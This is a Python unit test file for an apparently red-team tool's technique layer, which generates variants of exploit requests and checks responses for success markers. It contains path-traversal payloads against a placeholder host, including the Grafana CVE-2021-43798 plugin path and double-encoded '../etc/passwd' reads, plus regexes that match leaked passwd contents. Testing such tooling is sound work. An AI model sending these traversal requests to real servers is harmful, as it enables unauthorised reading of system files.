"""Unit tests for the parameterized technique layer, the variators and the marker oracle."""

from dataclasses import dataclass

from opfor.scenarios.attacksurface.lifecycle.technique import (
    MAX_VARIANTS,
    body_markers,
    has_marker,
    marker_hit,
    plan_variants,
)

# The real expect string grounding builds for the Grafana file-read recipe, with a header word
# clause, a body regex clause carrying nested parentheses, and a status clause.
_GRAFANA_EXPECT = (
    "the CVE-2021-43798 reproduction is confirmed when the live response satisfies: "
    "header word matches (text/plain) and body regex matches "
    "(root:.*:0:([0-9]+): or \\/tmp\\/grafana\\.sock or \\[(fonts|extensions|Mail|files)\\]) "
    "and body status matches (200)"
)
_PASSWD = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"


@dataclass(frozen=True, kw_only=True)
class _Req:
    method: str = "GET"
    url: str = ""
    body: str = ""
    expect: str = ""


def test_body_markers_reads_only_body_clauses_keeping_nested_parens_whole():
    markers = body_markers(_GRAFANA_EXPECT)
    kinds = {k for k, _ in markers}
    patterns = [p for _, p in markers]
    # only body clauses, the header text/plain and the status 200 are not body content
    assert kinds == {"regex"}
    assert "root:.*:0:([0-9]+):" in patterns
    # the nested alternation is kept as one pattern, not split at its inner parenthesis
    assert "\\[(fonts|extensions|Mail|files)\\]" in patterns


def test_has_marker_true_for_recipe_false_for_observed():
    assert has_marker(_GRAFANA_EXPECT) is True
    assert has_marker("HTTP 200 text/html") is False


def test_marker_hit_matches_a_regex_body_marker():
    assert marker_hit(_PASSWD, _GRAFANA_EXPECT) is True
    assert marker_hit("a normal grafana login page", _GRAFANA_EXPECT) is False


def test_marker_hit_word_marker_is_a_substring():
    expect = "body word matches (You have an error in your SQL syntax)"
    assert marker_hit("... You have an error in your SQL syntax near ...", expect) is True
    assert marker_hit("ok", expect) is False


def test_plan_variants_seed_only_when_nothing_to_adapt():
    variants = plan_variants(_Req(url="https://t.example/api/health"))
    assert [v.label for v in variants] == ["seed"]


def test_plan_variants_varies_traversal_depth_and_encoding_for_a_read():
    req = _Req(url="https://t.example/x?f=..%252f..%252fetc%252fpasswd")
    labels = [v.label for v in plan_variants(req)]
    assert "seed" in labels
    assert any(l.startswith("depth") for l in labels)
    assert any(l.startswith("encode") for l in labels)
    assert len(labels) <= MAX_VARIANTS


def test_plan_variants_does_not_vary_a_write():
    req = _Req(method="POST", url="https://t.example/x?p=../../../etc/passwd", body="{}")
    assert [v.label for v in plan_variants(req)] == ["seed"]


def test_plan_variants_rebases_when_a_prefix_is_given():
    req = _Req(url="https://t.example/public/plugins/x/../../../etc/passwd")
    variants = plan_variants(req, base_paths=("/grafana",))
    rebased = next(v for v in variants if v.label == "rebase:/grafana")
    assert rebased.url == "https://t.example/grafana/public/plugins/x/../../../etc/passwd"
